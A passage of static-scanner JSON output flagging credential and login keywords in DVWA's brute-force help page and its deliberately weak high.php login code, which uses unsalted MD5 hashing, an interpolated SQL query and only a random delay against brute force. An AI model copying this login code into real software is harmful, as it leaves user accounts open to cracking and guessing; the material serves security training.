        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 103,
        "endLocationLine": 55,
        "endLocationColumn": 111
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n\t&lt;/tr&gt;\n",
        "startLocationLine": 56,
        "startLocationColumn": 57,
        "endLocationLine": 56,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 91,
        "endLocationLine": 55,
        "endLocationColumn": 99
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 6,
        "endLocationLine": 9,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 59,
        "endLocationLine": 10,
        "endLocationColumn": 67
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n",
        "startLocationLine": 12,
        "startLocationColumn": 142,
        "endLocationLine": 12,
        "endLocationColumn": 150
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n",
        "startLocationLine": 14,
        "startLocationColumn": 78,
        "endLocationLine": 14,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n\t\t\tbe successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords\n\t\t\tmaking the attack time longer.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 19,
        "startLocationColumn": 45,
        "endLocationLine": 19,
        "endLocationColumn": 53
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n\t\t\tbe successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords\n\t\t\tmaking the attack time longer.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 20,
        "startLocationColumn": 108,
        "endLocationLine": 20,
        "endLocationColumn": 116
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Your goal is to get the administrator’s password by brute forcing. Bonus points for getting the other four user passwords!&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has completely missed out &lt;u&gt;any protections methods&lt;/u&gt;, allowing for anyone to try as many times as they wish, to login to any user without any repercussions.&lt;/p&gt;\n",
        "startLocationLine": 26,
        "startLocationColumn": 46,
        "endLocationLine": 26,
        "endLocationColumn": 54
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 63,
        "endLocationLine": 55,
        "endLocationColumn": 71
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 103,
        "endLocationLine": 55,
        "endLocationColumn": 111
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n\t&lt;/tr&gt;\n",
        "startLocationLine": 56,
        "startLocationColumn": 57,
        "endLocationLine": 56,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 20,
        "endLocationLine": 3,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n",
        "startLocationLine": 8,
        "startLocationColumn": 18,
        "endLocationLine": 8,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check database\n",
        "startLocationLine": 13,
        "startLocationColumn": 18,
        "endLocationLine": 13,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 19,
        "startLocationColumn": 60,
        "endLocationLine": 19,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n",
        "startLocationLine": 28,
        "startLocationColumn": 31,
        "endLocationLine": 28,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Username",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 24,
        "endLocationLine": 34,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 40,
        "endLocationLine": 34,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 25,
        "startLocationColumn": 4,
        "endLocationLine": 25,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 25,
        "startLocationColumn": 19,
        "endLocationLine": 25,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 29,
        "startLocationColumn": 26,
        "endLocationLine": 29,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n",
        "startLocationLine": 8,
        "startLocationColumn": 18,
        "endLocationLine": 8,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Username",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 24,
        "endLocationLine": 34,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
